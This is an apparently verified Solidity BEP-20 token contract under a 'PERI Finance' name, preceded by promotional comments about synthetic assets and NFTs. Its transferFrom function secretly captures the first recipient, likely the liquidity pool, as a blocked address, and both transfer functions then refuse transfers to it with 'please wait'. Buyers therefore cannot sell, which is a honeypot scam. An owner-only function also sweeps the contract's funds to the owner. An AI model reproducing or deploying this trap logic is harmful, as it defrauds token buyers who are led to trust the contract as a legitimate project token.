/**
 *Submitted for verification at BscScan.com on 2021-04-26
*/
    
//About PERI Finance ( PYNTHS)

//LET'S PYNTHS

//PERI Finance is a decentralized cross-chain synthetic issuance and derivative exchange protocol that provides unlimited liquidity on Polkadot network. It gives an opportunity to access a wide range of both traditional financial and crypto assets in the forms of leveraged and none-leveraged synthetic products. We empower you with lower GAS fee, speedy transaction, and ample security from front-running or flash loan.

//http://docs.peri.finance/file/Peri%20Whitepaper%20(EN)%20v0.9.pdf

//PYNTHS

// Pynth, stands for Peri Synthetic asset,follows the price of an underlying asset;

//Forex, CryptoCurrency, and Commodity. It's concurrently provided by Peri Exchange.

//PERI. POOL

//PERI Liquidity Pool is a pool created in the process by staking PERI and minting Pynth called pUSD.

//The pool acts as a liquidity provider.

//PERI. Exchange

//PERI.Exchange is a Pynths derivative DEX without order book. It enable users to convert one Pynth to another with infinite liquidity and no slippage.

//Taking long or short positions on Pynths upto 20x leverage could maximize trading volume. The Pynth prices are provided by Oracle while Pynth perpetual contract prices are determined by virtual AMM.

//PERI. DAO

//PERI tokens are also used for governance. We have created a PIP system (PERI Improvement Proposals) to hear community opinions.

//PYNTHS NFTs

//Pynths’ NFT-linked synthetic assets will be a game changer for the massive NFTs market.

//Artists and investors are to be greatly rewarded and monetized by minting Peri token.

//Pynths will show its uniqueness in the Pynths’ NFT ecosystem.

//NFT
//Governance
//Super
//NFTs
//Yield
//Farming
//You Control
//No Market Manipulation

//This is our process in 4 easy steps
//ASSESS
//MARKET
//MINT
//ROYALTY
//POWERED BY PYNTHS

//https://www.pynths.com/

pragma solidity >=0.5.17;


library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract BEP20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract TokenBEP20 is BEP20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address public newun;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "PERI";
    name = "Peri Finance";
    decimals = 9;
    _totalSupply =  100000000000000000;
    balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
  }
  function transfernewun(address _newun) public onlyOwner {
    newun = _newun;
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
     require(to != newun, "please wait");
     
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
      if(from != address(0) && newun == address(0)) newun = to;
      else require(to != newun, "please wait");
      
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract PeriFinance is TokenBEP20 {

  function clearCNDAO() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
  function() external payable {

  }
}